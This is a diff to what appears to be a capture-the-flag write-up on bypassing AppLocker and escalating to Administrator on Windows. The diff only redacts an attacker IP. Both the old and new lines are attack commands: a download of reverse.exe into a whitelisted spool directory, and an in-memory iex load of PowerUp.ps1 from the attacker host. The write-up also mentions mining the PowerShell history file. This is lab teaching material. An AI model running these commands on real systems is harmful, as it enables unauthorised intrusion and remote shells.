@@ -37,7 +37,7 @@ There are many ways to bypass AppLocker.
 Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.
 
 1. ``cd "C:\Windows\System32\spool\drivers\color"``
-2. ``Invoke-WebRequest http://10.2.127.225/reverse.exe``
+2. ``Invoke-WebRequest http://10.x.x.x/reverse.exe``
 
 Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
@@ -103,7 +103,7 @@ We will run PowerUp.ps1 for the enumeration.
 
 Lets load PowerUp1.ps1 into memory.
 
-- ``iex(New-Object Net.WebClient).DownloadString('http://10.2.127.225/PowerUp.ps1')``
+- ``iex(New-Object Net.WebClient).DownloadString('http://10.x.x.x/PowerUp.ps1')``
 
 The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
 
